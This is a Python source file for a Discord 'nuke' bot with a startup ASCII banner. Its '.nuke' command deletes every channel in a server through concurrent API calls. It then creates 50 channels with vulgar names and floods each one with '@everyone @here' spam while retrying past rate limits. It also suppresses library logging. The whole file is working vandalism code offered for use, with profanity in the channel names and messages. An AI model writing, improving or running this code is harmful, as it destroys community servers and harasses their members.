import asyncio
import aiohttp
import discord
from discord.ext import commands
import os
import logging
import time

def set_console_title(title):
    try:
        os.system(f'title {title}')
    except:
        pass

def set_console_color(color):
    try:
        os.system(f'color {color}')
    except:
        pass

def show_ascii_art():
    os.system('mode con: cols=100 lines=30')
    set_console_color('04')
    os.system('cls')
    
    for _ in range(8):
        print()
    
    print()
    print('                                        ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██')
    print('                                        ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒')
    print('                                        ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░')
    print('                                        ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██')
    print('                                        ░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓')
    print('                                         ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒')
    print('                                         ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░')
    print('                                         ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░')
    print('                                           ░       ░  ░     ░  ░         ░  ░  ░')
    print('                                         ░')
    print()
    print()
    print('                                        Press Enter To Start Bot...')
    
    for _ in range(8):
        print()
    
    input()
    os.system('cls')
    set_console_color('07')

def load_config():
    config = {}
    with open('config.txt', 'r') as f:
        for line in f:
            if '=' in line:
                key, value = line.strip().split('=', 1)
                config[key] = value
    return config

set_console_title('@_nishan.mp3')
show_ascii_art()

config = load_config()
TOKEN = config.get('TOKEN', '')
PREFIX = config.get('PREFIX', '.')

discord_logger = logging.getLogger('discord')
discord_logger.setLevel(logging.CRITICAL)
discord_logger.addHandler(logging.NullHandler())

logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)
logging.getLogger('discord.client').setLevel(logging.CRITICAL)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

last_error_time = 0

async def delete_channel_via_api(session, channel_id, headers):
    try:
        async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as resp:
            return resp.status == 200 or resp.status == 204
    except:
        return False

async def create_channel_via_api(session, guild_id, headers, channel_data):
    try:
        async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=channel_data) as resp:
            if resp.status == 201:
                return await resp.json()
            return None
    except:
        return None

async def send_message_to_channel(channel, message):
    global last_error_time
    try:
        await channel.send(message)
        return True
    except discord.errors.HTTPException as e:
        if e.status == 429:
            current_time = time.time()
            if current_time - last_error_time > 1:
                print('\033[33mFailed To Send Message Api Cooldown\033[0m')
                last_error_time = current_time
            return False
        return False
    except:
        return False

def get_spam_message():
    return '@SMASHED BY MARKY @everyone @here'

@bot.event
async def on_ready():
    print(f'\033[92m✓\033[0m \033[1m{bot.user}\033[0m \033[92mIs Ready\033[0m')

@bot.command(name='nuke')
async def nuke(ctx):
    if not ctx.guild:
        return
    
    guild = ctx.guild
    server_name = guild.name
    
    headers = {
        'Authorization': f'Bot {TOKEN}',
        'Content-Type': 'application/json',
        'User-Agent': 'DiscordBot'
    }
    
    async with aiohttp.ClientSession() as session:
        delete_tasks = []
        for channel in guild.channels:
            delete_tasks.append(delete_channel_via_api(session, channel.id, headers))
        
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)
        
        channel_creation_tasks = []
        for i in range(50):
            channel_data = {
                'name': 'fucked-by-marky',
                'type': 0,
                'topic': 'MARKY/NISHAN RUNS THE CORD',
                'parent_id': None
            }
            channel_creation_tasks.append(create_channel_via_api(session, guild.id, headers, channel_data))
        
        created_channels = await asyncio.gather(*channel_creation_tasks, return_exceptions=True)
        
        valid_channels = []
        for result in created_channels:
            if result and isinstance(result, dict) and 'id' in result:
                channel_obj = bot.get_channel(int(result['id']))
                if channel_obj:
                    valid_channels.append(channel_obj)
        
        await asyncio.sleep(0.5)
        
        async def spam_channel(channel):
            messages_sent = 0
            max_attempts = 50
            attempt_count = 0
            
            while messages_sent < 10 and attempt_count < max_attempts:
                message_tasks = []
                messages_needed = 10 - messages_sent
                
                for _ in range(messages_needed):
                    spam_msg = get_spam_message()
                    message_tasks.append(send_message_to_channel(channel, spam_msg))
                
                results = await asyncio.gather(*message_tasks, return_exceptions=True)
                messages_sent += sum(1 for r in results if r is True)
                attempt_count += 1
                
                if messages_sent < 10:
                    await asyncio.sleep(0.05)
        
        spam_tasks = [spam_channel(channel) for channel in valid_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        
        print(f'\033[92mSucceeded To Nuke\033[0m \033[1m{server_name}\033[0m')

bot.run(TOKEN)
